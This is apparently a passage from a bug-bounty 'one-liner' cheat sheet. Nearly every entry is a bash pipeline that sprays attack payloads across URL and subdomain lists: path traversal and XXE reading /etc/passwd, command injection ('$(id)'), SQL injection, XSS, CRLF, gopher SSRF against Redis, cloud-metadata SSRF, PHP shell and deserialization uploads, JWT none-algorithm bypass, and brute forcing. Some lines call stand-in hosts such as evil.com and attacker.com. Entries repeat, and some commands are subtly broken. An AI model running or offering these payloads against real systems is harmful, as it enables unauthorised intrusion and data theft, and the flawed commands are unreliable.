cat all_urls.txt | qsreplace '../../etc/passwd' | httpx -silent -fr 'root:x' -o dir_traversal.txt
```

### Azure Storage Enumeration
```bash
subfinder -d target.com | sed 's/$/.blob.core.windows.net/' | httpx -silent -mc 200 -o open_azure_blobs.txt
```

### Subdomain Takeover Detection (CNAME Pointing to Unclaimed Services)
```bash
subfinder -d target.com | dnsx -silent -a -resp-only | nuclei -silent -t takeover-detection/ -o takeover_candidates.txt
```

### Unauthorized Admin Panel Access
```bash
cat all_urls.txt | httpx -silent -path-list <(echo -e '/admin\n/dashboard\n/cms\n/panel\n/root\n/console') -mc 200 -o exposed_admins.txt
```

### IPv6 Asset Discovery (Many Orgs Forget This)
```bash
subfinder -d target.com | dnsx -silent -aaaa -resp-only | tee ipv6_assets.txt
```

### Template Injection Finder (SSTI)
```bash
cat all_urls.txt | gf ssti | qsreplace '{{7*7}}' | httpx -silent -fr '49' -o ssti_vulns.txt
```

### Open Redirect Detection
```bash
cat all_urls.txt | gf redirect | qsreplace 'https://evil.com' | httpx -silent -fr 'Location: https://evil.com' -o open_redirects.txt
```

### Server-Side Request Forgery (SSRF)
```bash
cat all_urls.txt | gf ssrf | qsreplace 'http://your-burpcollab-url.burpcollaborator.net' | httpx -silent -o ssrf_candidates.txt
```

### Exposed .git Repositories (Code Leakage)
```bash
cat subdomains.txt | httpx -silent -path '/.git/config' -mc 200 -o exposed_git_repos.txt
```

### Command Injection Finder
```bash
cat all_urls.txt | gf cmd-injection | qsreplace '&& id' | httpx -silent -fr 'uid=' -o cmd_injection.txt
```

### Prototype Pollution Detection
```bash
cat all_urls.txt | qsreplace '__proto__[exploit]=polluted' | httpx -silent -fr 'polluted' -o prototype_pollution.txt
```

### Email/PII Leakage in Responses
```bash
cat all_urls.txt | httpx -silent -fr '[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}' -o leaked_emails.txt
```

### Host Header Injection
```bash
cat all_urls.txt | httpx -silent -H 'Host: attacker.com' -fr 'attacker.com' -o host_header_injection.txt
```

### Path Traversal (Windows)
```bash
cat all_urls.txt | qsreplace 'C:/Windows/win.ini' | httpx -silent -fr 'for 16-bit app support' -o windows_traversal.txt
```

### Sensitive Files (Backup Files Exposure)
```bash
cat subdomains.txt | httpx -silent -path-list <(echo -e '/.env\n/config.php.bak\n/database.yml\n/backup.zip') -mc 200 -o sensitive_files.txt
```

### Exposed Config Panels (CMS, Jenkins, PhpMyAdmin)
```bash
cat subdomains.txt | httpx -silent -path-list <(echo -e '/phpmyadmin\n/jenkins\n/wp-admin\n/admin\n/cpanel') -mc 200 -o exposed_panels.txt
```

### Hardcoded API Keys in JS Files
```bash
cat all_js_urls.txt | xargs -I{} curl -s {} | grep -E 'apiKey|apikey|secret|token|bearer' | tee hardcoded_api_keys.txt
```

### Spring Boot Actuator Exposed Endpoints
```bash
cat subdomains.txt | httpx -silent -path '/actuator/health' -mc 200 -o exposed_actuators.txt
```

### Gopher SSRF (Redis/SMTP Attack)
```bash
cat all_urls.txt | qsreplace 'gopher://127.0.0.1:6379/_COMMAND' | httpx -silent -o gopher_ssrf_candidates.txt
```

### HTML Injection (Reflected)
```bash
cat all_urls.txt | gf xss | qsreplace '<h1>PWNED</h1>' | httpx -silent -fr '<h1>PWNED</h1>' -o html_injection.txt
```

### API Token Misconfiguration (Bearer Token Disclosure)
```bash
cat all_urls.txt | httpx -silent -hdrs | grep -i 'authorization: Bearer' | tee bearer_tokens.txt
```

### WordPress Plugin Vulnerabilities (Outdated Plugins)
```bash
nuclei -l subdomains.txt -t cves/wordpress/ -o wp_vulns.txt
```

### Broken Link Hijacking (Subdomain Takeover via Broken Links)
```bash
cat subdomains.txt | gau | grep -E '\.(js|css|png|jpg|jpeg|gif|svg|woff|ttf|ico)' | httpx -silent -status-code -o broken_links.txt
```

### CRLF Injection (HTTP Response Splitting)
```bash
cat all_urls.txt | qsreplace '%0d%0aSet-Cookie:crlftest=crlfpoc' | httpx -silent -fr 'crlftest=crlfpoc' -o crlf_injection.txt
```

### Cloud Storage Misconfig (AWS S3 Bucket Public Access)
```bash
cat subdomains.txt | nuclei -t misconfiguration/ -o s3_buckets.txt
```

### HTTP Method Fuzzing (Check PUT/DELETE enabled)
```bash
cat subdomains.txt | httpx -silent -methods PUT,DELETE -mc 200 -o risky_methods.txt
```

### GraphQL Misconfig (Introspection Enabled)
```bash
cat subdomains.txt | httpx -silent -path '/graphql' -mc 200 -fr 'Introspection Query' -o graphql_introspection.txt
```

### DNS Zone Transfer (AXFR Check)
```bash
for domain in $(cat subdomains.txt); do dig axfr $domain @ns1.$domain; done
```

### CSP Bypass/Weak CSP Check
```bash
cat subdomains.txt | nuclei -t security-misconfiguration/csp-missing.yaml -o weak_csp.txt
```

### Backup Files (Git, SQL Dumps, Zip Archives)
```bash
cat subdomains.txt | httpx -silent -path-list <(echo -e '/backup.sql\n/.git/config\n/backup.zip') -mc 200 -o backup_leaks.txt
```

### Session Fixation (Check if sessionID can be set)
```bash
cat all_urls.txt | qsreplace 'sessionid=abc123' | httpx -silent -fr 'sessionid=abc123' -o session_fixation.txt
```

### JWT Secret Bruteforce (Weak Signing Keys)
```bash
cat subdomains.txt | jwt_tool -I -bruteforce wordlist.txt -o weak_jwt_keys.txt
```

### Exposed Email Addresses in Webpages
```bash
cat all_urls.txt | httpx -silent -fr '[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}' -o leaked_emails.txt
```


### XML External Entity Injection (XXE)
```bash
cat all_urls.txt | gf xxe | qsreplace '<?xml version="1.0"?><!DOCTYPE data [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><data>&xxe;</data>' | httpx -silent -fr 'root:x' -o xxe_poc.txt
```

### Exposed Directory Listings (Misconfig)
```bash
cat subdomains.txt | httpx -silent -path '/' -fr 'Index of' -o open_dirs.txt
```

### Kubernetes Dashboard Exposure
```bash
cat subdomains.txt | httpx -silent -path '/api/v1/namespaces/kube-system/services/https:kubernetes-dashboard:/proxy/' -mc 200 -o exposed_k8s_dashboard.txt
```

### Exposed Swagger API (Public API Docs)
```bash
cat subdomains.txt | httpx -silent -path '/swagger-ui.html' -mc 200 -o exposed_swagger.txt
```

### Open Redirect Detection
```bash
cat all_urls.txt | gf redirect | qsreplace 'https://evil.com' | httpx -silent -fr 'evil.com' -o open_redirects.txt
```

### Directory Traversal (../ Exploit)
```bash
cat all_urls.txt | gf lfi | qsreplace '../etc/passwd' | httpx -silent -fr 'root:x' -o directory_traversal.txt
```

### Server-Side Template Injection (SSTI)
```bash
cat all_urls.txt | gf ssti | qsreplace '{{7*7}}' | httpx -silent -fr '49' -o ssti_found.txt
```

### Insecure Cross-Origin Resource Sharing (CORS)
```bash
cat subdomains.txt | httpx -silent -H "Origin: https://evil.com" -fr 'https://evil.com' -o weak_cors.txt
```

### SQL Injection - Quick Payload Fire
```bash
cat all_urls.txt | gf sqli | qsreplace "' OR '1'='1" | httpx -silent -fr 'error' -o sqli_poc.txt
```

### Backup Config Files (env/config.php)
```bash
cat subdomains.txt | httpx -silent -path-list <(echo -e '/.env\n/config.php\n/settings.py\n/config.json') -mc 200 -o leaked_configs.txt
```

### SSRF (Server-Side Request Forgery)
```bash
cat all_urls.txt | gf ssrf | qsreplace 'http://burpcollaborator.net' | httpx -silent -o ssrf_candidates.txt
```

### File Upload (Potential Upload Endpoints)
```bash
cat all_urls.txt | gf upload | httpx -silent -mc 200 -o upload_endpoints.txt
```

### Sensitive Data Exposure (Credit Card, API Keys)
```bash
cat all_urls.txt | httpx -silent -fr 'sk_live|pk_live|eyJhbGci|-----BEGIN PRIVATE KEY-----|4[0-9]{12}(?:[0-9]{3})?' -o sensitive_data.txt
```

### JWT Token Leak (in URL or Response)
```bash
cat all_urls.txt | httpx -silent -fr 'eyJ' -o jwt_leaks.txt
```

### Exposed Database Panels (phpMyAdmin, Mongo, etc)
```bash
cat subdomains.txt | httpx -silent -path-list <(echo -e '/phpmyadmin/\n/admin/\n/mongo-express/') -mc 200 -o exposed_db_panels.txt
```

### GIT Repo Exposure
```bash
cat subdomains.txt | httpx -silent -path '/.git/config' -mc 200 -o exposed_git.txt
```

### Debug Pages (dev.php/test.php)
```bash
cat subdomains.txt | httpx -silent -path-list <(echo -e '/test.php\n/dev.php\n/debug.php') -mc 200 -o debug_pages.txt
```

### Exposed API Keys in JavaScript Files
```bash
cat subdomains.txt | gau | grep '\.js$' | httpx -silent -fr 'AIza|sk_live|ghp_' -o api_key_leaks.txt
```

### Unsafe File Upload (PHP Reverse Shell Upload)
```bash
cat upload_endpoints.txt | qsreplace 'file=shell.php' | httpx -silent -mc 200 -o shell_upload.txt
```

### Clickjacking (Missing X-Frame-Options)
```bash
cat subdomains.txt | httpx -silent -header 'X-Frame-Options' -o missing_xfo.txt
```

### HTTP Parameter Pollution (Duplicate Params)
```bash
cat all_urls.txt | qsreplace 'param1=value1&param1=value2' | httpx -silent -mc 200 -o hpp_candidates.txt
```

### Server Info Disclosure (Version Leaks)
```bash
cat subdomains.txt | httpx -silent -sc -title -o server_versions.txt
```

### Password Reset Token Leak in URL
```bash
cat all_urls.txt | grep -i 'reset' | grep -E 'token=|key=' | httpx -silent -o reset_token_leak.txt
```

### Host Header Injection
```bash
cat subdomains.txt | httpx -silent -H "Host: attacker.com" -fr "attacker.com" -o host_header_injection.txt
```

### Web Cache Poisoning
```bash
cat all_urls.txt | qsreplace 'X-Original-URL: /evil' | httpx -silent -fr 'evil' -o cache_poisoning.txt
```

### AWS Bucket Takeover (S3)
```bash
cat subdomains.txt | awk -F. '{print $1"."$2}' | while read domain; do aws s3 ls s3://$domain --no-sign-request; done
```

### Exposed Secret Tokens in Robots.txt
```bash
cat subdomains.txt | httpx -silent -path /robots.txt -fr 'token|key|secret' -o secret_leak_robots.txt
```

### Email Injection in Contact Forms
```bash
cat contact_forms_urls.txt | qsreplace 'email=attacker%0A%0DCC%3Aevil@attacker.com' | httpx -silent -mc 200 -o email_injection.txt
```

### PHP Info Disclosure (info.php)
```bash
cat subdomains.txt | httpx -silent -path /info.php -mc 200 -o phpinfo_exposed.txt
```

### Debug Endpoints Exposure (Spring Boot Actuator)
```bash
cat subdomains.txt | httpx -silent -path-list <(echo -e '/actuator/health\n/actuator/env\n/actuator/mappings') -mc 200 -o exposed_actuator.txt
```

### Directory Listing Enabled
```bash
cat subdomains.txt | httpx -silent -path '/' -fr 'Index of' -o directory_listing.txt
```

### Kubernetes Dashboard Exposure
```bash
cat subdomains.txt | httpx -silent -path '/#/login' -mc 200 -o kube_dashboard_exposed.txt
```

### Log File Exposure (access.log, error.log)
```bash
cat subdomains.txt | httpx -silent -path-list <(echo -e '/access.log\n/error.log') -mc 200 -o exposed_logs.txt
```

### Backup Files in Root (zip, tar, sql)
```bash
cat subdomains.txt | httpx -silent -path-list <(echo -e '/backup.zip\n/db.sql\n/site.tar.gz') -mc 200 -o backup_files.txt
```

### Insecure Direct Object Reference (IDOR)
```bash
cat idor_urls.txt | qsreplace 'user_id=123' | httpx -silent -mc 200 -o idor_candidates.txt
```

### CSP Bypass (Missing or Weak CSP)
```bash
cat subdomains.txt | httpx -silent -H 'Content-Security-Policy' -o weak_csp.txt
```

### Open API Endpoints Discovery
```bash
cat subdomains.txt | httpx -silent -path /swagger.json -mc 200 -o swagger_exposed.txt
```

### OAuth Token Leak in URLs
```bash
cat all_urls.txt | grep -i 'access_token=' -o oauth_token_leaks.txt
```

### GraphQL Endpoint Discovery
```bash
cat subdomains.txt | httpx -silent -path /graphql -mc 200 -o graphql_found.txt
```

### Prototype Pollution via Params
```bash
cat all_urls.txt | qsreplace '__proto__[test]=polluted' | httpx -silent -fr 'polluted' -o prototype_pollution.txt
```

### WordPress XML-RPC Abuse
```bash
cat subdomains.txt | httpx -silent -path /xmlrpc.php -mc 200 -o xmlrpc_found.txt
```

🔐  JWT None Algorithm Bypass Check  
```bash
cat all_urls.txt | qsreplace 'token=eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ.' | httpx -silent -mc 200 -o jwt_none_bypass.txt
```

🚀  Session Fixation via Set-Cookie  
```bash
cat subdomains.txt | httpx -silent -H "Cookie: sessionid=attacker-session" -o session_fixation.txt
```

🛜  Open Redirects  
```bash
cat urls.txt | qsreplace 'https://evil.com' | httpx -silent -fr 'evil.com' -o open_redirects.txt
```

🗂️  Exposed .git Folder  
```bash
cat subdomains.txt | httpx -silent -path /.git/HEAD -mc 200 -o git_exposed.txt
```

🌍  Exposed .env Files (Secrets Leak)  
```bash
cat subdomains.txt | httpx -silent -path /.env -mc 200 -o env_leaks.txt
```

🧬  GraphQL Introspection Enabled  
```bash
cat subdomains.txt | httpx -silent -path /graphql -x POST -body '{"query":"query IntrospectionQuery { __schema { types { name } } }"}' -fr 'data' -o graphql_introspection.txt
```

Insecure CORS (Wildcard or Null)  
```bash
cat subdomains.txt | httpx -silent -H "Origin: https://evil.com" -fr "https://evil.com" -o insecure_cors.txt
```

📂  Backup Files Discovery (.zip, .sql, etc)  
```bash
cat subdomains.txt | httpx -silent -path-list <(echo -e '/backup.zip\n/db.sql\n/site_backup.tar.gz') -mc 200 -o backup_files.txt
```

📊  Admin Panels Discovery  
```bash
cat subdomains.txt | httpx -silent -path-list <(echo -e '/admin\n/dashboard\n/panel\n/cp') -mc 200 -o admin_panels.txt
```

💀  Server Side Template Injection (SSTI)  
```bash
cat all_urls.txt | qsreplace '{{7*7}}' | httpx -silent -fr '49' -o ssti.txt
```

📋  Path Traversal (../ Disclosure)  
```bash
cat all_urls.txt | qsreplace '../../../../etc/passwd' | httpx -silent -fr 'root:x' -o path_traversal.txt
```

🐍  Python Pickle Injection (if Flask or Python backend)  
```bash
cat all_urls.txt | qsreplace '__class__=os.system&cmd=id' | httpx -silent -fr 'uid=' -o pickle_injection.txt
```

CRLF Injection (Header Splitting)  
```bash
cat all_urls.txt | qsreplace '%0d%0aHeader: evil' | httpx -silent -fr 'Header: evil' -o crlf.txt
```

💾  Exposed Database Admin Panels  
```bash
cat subdomains.txt | httpx -silent -path-list <(echo -e '/phpmyadmin\n/adminer\n/sql') -mc 200 -o db_admin_panels.txt
```

🧱  File Upload Misconfig (Can upload PHP/JSP)  
```bash
cat upload_endpoints.txt | xargs -I {} curl -X POST -F 'file=@payload.php' {} -s -o - | grep 'shell_exec' -B 2
```

🕵️‍♂️  Cloud Metadata API Exposure (AWS/GCP)  
```bash
cat subdomains.txt | httpx -silent -path /latest/meta-data/ -mc 200 -o metadata_exposed.txt
```

💣  CRLF in Redirect Location Header  
```bash
cat urls.txt | qsreplace '%0d%0aLocation:%20https://evil.com' | httpx -silent -fr 'evil.com' -o crlf_redirect.txt
```

📑  XSS in JSON Response (Reflected)  
```bash
cat urls.txt | qsreplace '"><script>alert(1)</script>' | httpx -silent -fr 'alert(1)' -o xss.json.txt
```

🔌  Exposed Internal IPs (Debug Responses)  
```bash
cat urls.txt | httpx -silent -fr '10\.|172\.|192\.168\.' -o internal_ips.txt
```

🌐  Misconfigured WAF Bypass  
```bash
cat urls.txt | qsreplace '><script>alert(1)</script>' | httpx -silent -mc 403 -o waf_detected.txt
cat waf_detected.txt | qsreplace '><script>alert(1)</script>' | anew bypass_payloads.txt
cat bypass_payloads.txt | httpx -silent -mc 200 -o waf_bypass.txt
```

📤  Information Disclosure via Verb Tampering  
```bash
cat subdomains.txt | httpx -silent -method OPTIONS -o verb_tampering.txt
```

🧰 **S3 Bucket Discovery via Subdomain Bruteforce**  
```bash
cat subdomains.txt | awk -F. '{print $1"."$2}' | xargs -I {} aws s3 ls s3://{} --no-sign-request 2>/dev/null | tee s3_buckets.txt
```

💧 **AWS S3 Bucket Takeover (Subdomain Takeover)**  
```bash
cat subdomains.txt | xargs -I {} host {} | grep 'amazonaws.com' | awk '{print $1}' | httpx -silent -mc 404 -o vulnerable_s3.txt
```

📜 **Exposed Swagger/OpenAPI Endpoints**  
```bash
cat subdomains.txt | httpx -silent -path-list <(echo -e '/swagger.json\n/openapi.json\n/api-docs') -mc 200 -o openapi_endpoints.txt
```

**Prototype Pollution in Query Params**  
```bash
cat urls.txt | qsreplace '__proto__[evil]=polluted' | httpx -silent -fr 'polluted' -o prototype_pollution.txt
```

💉 **SQL Injection (Basic Reflex Check)**  
```bash
cat urls.txt | qsreplace "'" | httpx -silent -fr 'SQL syntax' -o sqli.txt
```

🔗 **SSRF (Internal IP Scan via Open Redirect or URL Input)**  
```bash
cat urls.txt | qsreplace 'http://169.254.169.254/latest/meta-data/' | httpx -silent -fr 'ami-id' -o ssrf_aws_metadata.txt
```

🔥 **Spring Boot Actuator Exposure (DevOps Misconfig)**  
```bash
cat subdomains.txt | httpx -silent -path /actuator/env -mc 200 -o springboot_actuator_exposed.txt
```

**JWT None Algorithm Bypass**  
```bash
cat urls.txt | qsreplace 'eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ.' | httpx -silent -fr 'admin' -o jwt_none_bypass.txt
```

**Firebase Misconfig (Open Firebase Databases)**  
```bash
cat subdomains.txt | sed 's/$/.firebaseio.com/' | httpx -silent -path /.json -mc 200 -o open_firebase.txt
```

📡 **GraphQL Playground/Console Discovery**  
```bash
cat subdomains.txt | httpx -silent -path /graphiql -mc 200 -o graphql_console.txt
```

⚠️ **SOAP Service Discovery (Old APIs)**  
```bash
cat subdomains.txt | httpx -silent -path /services.wsdl -mc 200 -o soap_services.txt
```

📬 **Email Injection via Contact Forms**  
```bash
cat urls.txt | qsreplace 'test%0d%0aBCC:evil@attacker.com' | httpx -silent -fr 'evil@attacker.com' -o email_injection.txt
```

🕵️‍♂️ **GCP Bucket Enumeration (Public Buckets)**  
```bash
cat subdomains.txt | sed 's/$/.storage.googleapis.com/' | httpx -silent -mc 200 -o gcp_buckets.txt
```

🛠️ **Deserialization via File Upload (PHP/JAVA Specific)**  
```bash
cat upload_endpoints.txt | xargs -I {} curl -X POST -F 'file=@payload.ser' {} -s -o - | grep 'java.lang' -B 2
```

🔗 **IDOR Detection via Incremental IDs**  
```bash
cat urls.txt | qsreplace 'id=123' | anew incremental_ids.txt
cat incremental_ids.txt | qsreplace 'id=124' | httpx -silent -fr 'profile' -o idor_found.txt
```

**Azure Blob Storage Enumeration**  
```bash
cat subdomains.txt | sed 's/$/.blob.core.windows.net/' | httpx -silent -mc 200 -o azure_blobs.txt
```

🎯 **XXE Injection via File Upload (XML Files)**  
```bash
cat upload_endpoints.txt | xargs -I {} curl -X POST -F 'file=@payload.xml' {} -s -o - | grep 'root:' -B 2
```

📊 **Exposed Kibana Dashboards (DevOps)**  
```bash
cat subdomains.txt | httpx -silent -path /app/kibana -mc 200 -o exposed_kibana.txt
```

**CVE Scanner for Web Targets (Nuclei One-Liner)**  
```bash
cat subdomains.txt | nuclei -silent -t cves/ -o found_cves.txt
```

📈 **LFI via Log Poisoning**  
```bash
cat urls.txt | qsreplace '../../../../../../../../var/log/nginx/access.log' | httpx -silent -fr 'GET /' -o log_poisoning_lfi.txt
```

🗄️ **Exposed Jenkins Console (DevOps)**  
```bash
cat subdomains.txt | httpx -silent -path /script -mc 200 -o exposed_jenkins.txt
```

📂  Exposed Git Directories (Sensitive Files in .git)
```bash
cat subdomains.txt | httpx -silent -path /.git/config -mc 200 -o exposed_git.txt
```

🔥  Open Kibana (Cloud Misconfiguration)
```bash
cat subdomains.txt | httpx -silent -path /app/kibana -mc 200 -o open_kibana.txt
```

📤  Exposed Env Files (Secrets Disclosure)
```bash
cat subdomains.txt | httpx -silent -path /.env -mc 200 -o exposed_env.txt
```

🗂️  Directory Listing Enabled (Info Disclosure)
```bash
cat subdomains.txt | httpx -silent -path / -fr 'Index of /' -o dir_listing.txt
```

💉  Command Injection via Input Parameters
```bash
cat urls.txt | qsreplace '$(id)' | httpx -silent -fr 'uid=' -o command_injection.txt
```

🪄  CORS Misconfiguration Check (Origin Reflection)
```bash
cat urls.txt | httpx -silent -H 'Origin: https://evil.com' -fr 'https://evil.com' -o cors_misconfig.txt
```

🔗  Open Redirect (URL Parameter Test)
```bash
cat urls.txt | qsreplace 'https://evil.com' | httpx -silent -fr 'evil.com' -o open_redirect.txt
```

Backup/Old Files Exposure
```bash
cat subdomains.txt | httpx -silent -path-list <(echo -e '/index.php~\n/config.old\n/database.bak') -mc 200 -o exposed_backup_files.txt
```

🕵️  Clickjacking (Missing X-Frame-Options)
```bash
cat subdomains.txt | httpx -silent -hx -o headers.txt
cat headers.txt | grep -E "x-frame-options|X-Frame-Options" -i -L > clickjacking_vulnerable.txt
```

⚙️  Misconfigured Jenkins Instances
```bash
cat subdomains.txt | httpx -silent -path /script -mc 200 -o exposed_jenkins.txt
```

💾  Open MongoDB Instances (Cloud Exposure)
```bash
cat ips.txt | xargs -I{} sh -c 'echo {} && mongosh --host {} --eval "db.stats()"' 2>/dev/null | tee open_mongodb.txt
```

Exposed Private Keys (Accidental Disclosure)
```bash
cat subdomains.txt | httpx -silent -path-list <(echo -e '/id_rsa\n/keys/privkey.pem\n/.ssh/id_rsa') -mc 200 -o exposed_keys.txt
```

Insecure JSONP Endpoints (Callback Hijacking)
```bash
cat urls.txt | qsreplace 'callback=alert(document.domain)' | httpx -silent -fr 'alert(document.domain)' -o jsonp_vulns.txt
```

Exposed phpinfo() Files (Info Disclosure)
```bash
cat subdomains.txt | httpx -silent -path /phpinfo.php -mc 200 -o exposed_phpinfo.txt
```

RCE via Deserialization (Java/PHP Payloads)
```bash
cat upload_urls.txt | xargs -I{} curl -X POST -F 'file=@payload.ser' {} -s | grep 'java.lang.Runtime' -o rce_found.txt
```

LFI via Log Files
```bash
cat urls.txt | qsreplace '../../../../../../../../var/log/nginx/access.log' | httpx -silent -fr 'GET /' -o log_lfi.txt
```

Exposed Docker APIs (DevOps Misconfig)
```bash
cat ips.txt | xargs -I{} curl -s -X GET "http://{}:2375/images/json" | grep 'Id' -B 2 | tee exposed_docker.txt
```

Amazon S3 Buckets (Open Buckets)
```bash
cat subdomains.txt | sed 's/$/.s3.amazonaws.com/' | httpx -silent -mc 200 -o open_s3_buckets.txt
```

Open Elasticsearch (DevOps Exposure)
```bash
cat ips.txt | xargs -I{} curl -s "http://{}:9200/_cat/indices?v" | grep -v 'master' | tee open_elasticsearch.txt
```

Backup Files in Web Root
```bash
cat urls.txt | sed 's/$/.bak/' | httpx -silent -mc 200 -o found_backups.txt
```

XSS in reflected parameters (quick check)
```bash
cat urls.txt | qsreplace '<script>alert(1)</script>' | httpx -silent -fr '<script>alert(1)</script>' -o xss_reflected.txt
```

SQL Injection (time-based detection)
```bash
cat urls.txt | qsreplace "' AND SLEEP(5)--" | httpx -silent -rt -o sqli_time_based.txt
```

Detect exposed Git repositories (.git folder)
```bash
cat subdomains.txt | httpx -silent -path /.git/HEAD -mc 200 -o exposed_git_repos.txt
```

Find Local File Inclusion (LFI)
```bash
cat urls.txt | qsreplace '../../../../../../../../etc/passwd' | httpx -silent -fr 'root:x:' -o lfi_found.txt
```

Open Directory Listing
```bash
cat subdomains.txt | httpx -silent -mc 200 -fr 'Index of' -o open_directory_listing.txt
```

Find Open Kibana Dashboards (Internal Leaks)
```bash
cat subdomains.txt | httpx -silent -path /app/kibana -mc 200 -o open_kibana.txt
```

Subdomain Takeover (Check NXDOMAIN)
```bash
subfinder -d target.com | httpx -silent -sc -o subs_status.txt
cat subs_status.txt | grep 'NXDOMAIN' > takeover_candidates.txt
```

Test for Host Header Injection
```bash
cat urls.txt | httpx -silent -H "Host: evil.com" -fr 'evil.com' -o host_header_injection.txt
```

Exposed Config Files
```bash
cat subdomains.txt | httpx -silent -path-list <(echo -e '/config.php\n/settings.py\n/.env\n/config.json') -mc 200 -o exposed_configs.txt
```

Detecting Exposed Admin Panels
```bash
cat subdomains.txt | httpx -silent -path-list <(echo -e '/admin\n/wp-admin\n/console\n/dashboard') -mc 200 -o admin_panels.txt
```

Command Injection Test
```bash
cat urls.txt | qsreplace '$(id)' | httpx -silent -fr 'uid=' -o command_injection.txt
```

Check for Backup Files (Old Configs)
```bash
cat subdomains.txt | httpx -silent -path-list <(echo -e '/backup.zip\n/db_backup.sql\n/config.old') -mc 200 -o backup_files_found.txt
```

Check for Open Redis Instances
```bash
cat subdomains.txt | httpx -silent -path / -p 6379 -o open_redis_instances.txt
```

Test for Open Proxy Misconfiguration
```bash
curl -x http://target.com http://example.com -v
```

XXE Injection Test
```bash
cat urls.txt | qsreplace '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>' | httpx -silent -fr 'root:x:' -o xxe_found.txt
```

Detect JWT Tokens in Response
```bash
cat urls.txt | httpx -silent -fr 'eyJ' -o jwt_leaks.txt
```

Server Version Disclosure (Fingerprinting)
```bash
cat subdomains.txt | httpx -silent -server -o server_versions.txt
```

Test PUT Method for File Upload
```bash
cat subdomains.txt | httpx -silent -method PUT -path '/test.txt' -body 'test upload' -mc 201,200 -o put_upload_possible.txt
```

Check for Debug Endpoints
```bash
cat subdomains.txt | httpx -silent -path /debug -mc 200 -o debug_endpoints.txt
```

Find Content Security Policy Bypass (Open Wildcards)
```bash
cat subdomains.txt | httpx -silent -hx | grep 'Content-Security-Policy' | grep '*'
```

Check for Public .DS_Store Files (Directory Listing)
```bash
cat subdomains.txt | httpx -silent -path /.DS_Store -mc 200 -o ds_store_leaks.txt
```

Find Open Jenkins Panels
```bash
cat subdomains.txt | httpx -silent -path /jenkins -mc 200 -o open_jenkins.txt
```

Detect Internal IP Leaks in Response
```bash
cat urls.txt | httpx -silent -fr '10.' -o internal_ip_leak.txt
```

Search for Open API Documentation (Swagger)
```bash
cat subdomains.txt | httpx -silent -path-list <(echo -e '/swagger-ui.html\n/api-docs\n/openapi.json') -mc 200 -o open_api_docs.txt
```

Find Exposed .env Files (Sensitive Configs)
```bash
cat subdomains.txt | httpx -silent -path /.env -mc 200 -o exposed_env.txt
```

Detect Exposed MySQL Dumps
```bash
cat subdomains.txt | httpx -silent -path /db.sql -mc 200 -o mysql_dumps.txt
```

Check for Misconfigured CORS (Allow-All)
```bash
cat urls.txt | httpx -silent -H 'Origin: https://evil.com' -fr 'Access-Control-Allow-Origin: https://evil.com' -o cors_misconfig.txt
```

Find Exposed Adminer (DB Management Interface)
```bash
cat subdomains.txt | httpx -silent -path /adminer.php -mc 200 -o exposed_adminer.txt
```

Search for Exposed Backup Files (.bak)
```bash
cat subdomains.txt | httpx -silent -path-list <(echo -e '/index.php.bak\n/config.bak\n/db.bak') -mc 200 -o backup_files.txt
```

Search for Test/Dev Subdomains (Staging)
```bash
subfinder -d target.com | grep -Ei 'dev|test|staging|qa' > staging_subdomains.txt
```

Detect Open RDP Servers (Network Exposures)
```bash
cat ips.txt | naabu -p 3389 -silent -o open_rdp.txt
```

Detect AWS S3 Buckets via Subdomains
```bash
cat subdomains.txt | grep -E 's3.amazonaws.com|amazonaws' > s3_buckets.txt
```

Identify Weak Security Headers (Lack of CSP, HSTS)
```bash
cat urls.txt | httpx -silent -hx | grep -v -E 'Strict-Transport-Security|Content-Security-Policy' > weak_headers.txt
```

Check for Exposed Docker API
```bash
cat ips.txt | naabu -p 2375 -silent -o open_docker_api.txt
```

Find Open Grafana Dashboards
```bash
cat subdomains.txt | httpx -silent -path /login -mc 200 -fr 'Grafana' -o open_grafana.txt
```

Check for Public PHP Info Pages (Leaking Config)
```bash
cat urls.txt | httpx -silent -path /phpinfo.php -mc 200 -o phpinfo_exposed.txt
```

Find Exposed Laravel Debug Panels
```bash
cat subdomains.txt | httpx -silent -path /_debugbar -mc 200 -o laravel_debug.txt
```

Look for Open ElasticSearch (Data Exposure)
```bash
cat ips.txt | naabu -p 9200 -silent -o open_elasticsearch.txt
```

Identify Directory Traversal (Simple Payload)
```bash
cat urls.txt | qsreplace '../../../../../etc/passwd' | httpx -silent -fr 'root:x:' -o directory_traversal.txt
```

Find Open Kibana Dashboards (Sensitive Logs)
```bash
cat subdomains.txt | httpx -silent -path /app/kibana -mc 200 -o open_kibana.txt
```

Detect Exposed Wordpress Debug Logs
```bash
cat subdomains.txt | httpx -silent -path /wp-content/debug.log -mc 200 -o wp_debug_logs.txt
```

Find Exposed FTP Servers (Anonymous Access)
```bash
cat ips.txt | naabu -p 21 -silent -o open_ftp.txt
```

Detect Open MongoDB Databases (No Auth)
```bash
cat ips.txt | naabu -p 27017 -silent -o open_mongo.txt
```

Identify Open PhpMyAdmin Panels
```bash
cat subdomains.txt | httpx -silent -path /phpmyadmin -mc 200 -o open_phpmyadmin.txt
```

Search for Backup Files with Extensions (.bak, .old)
```bash
cat subdomains.txt | gauplus | grep -E '\.bak|\.old|\.backup' > backup_files_found.txt
```

Check for Open Directories (Index of Listings)
```bash
cat subdomains.txt | httpx -silent -mc 200 -fr 'Index of /' -o open_directories.txt
```

Find Public GraphQL Endpoints (API Leaks)
```bash
cat subdomains.txt | httpx -silent -path /graphql -mc 200 -o open_graphql.txt
```

Identify Misconfigured AWS Bucket via Headers
```bash
cat urls.txt | httpx -silent -hx | grep -i 'x-amz' > aws_bucket_leaks.txt
```

Check for Publicly Accessible Jenkins Script Console
```bash
cat subdomains.txt | httpx -silent -path /script -mc 200 -o jenkins_script_console.txt
```

Check for Exposed SVN Files
```bash
cat subdomains.txt | httpx -silent -path /.svn/entries -mc 200 -o svn_leaks.txt
```

Find Publicly Exposed Config.json Files
```bash
cat subdomains.txt | httpx -silent -path /config.json -mc 200 -o config_json_exposed.txt
```

Identify Unauthenticated Redis Servers
```bash
cat ips.txt | naabu -p 6379 -silent -o open_redis.txt
```

Detect Exposed Private Keys in URLs
```bash
cat urls.txt | grep -Ei 'private_key|id_rsa|pem' > private_key_leaks.txt
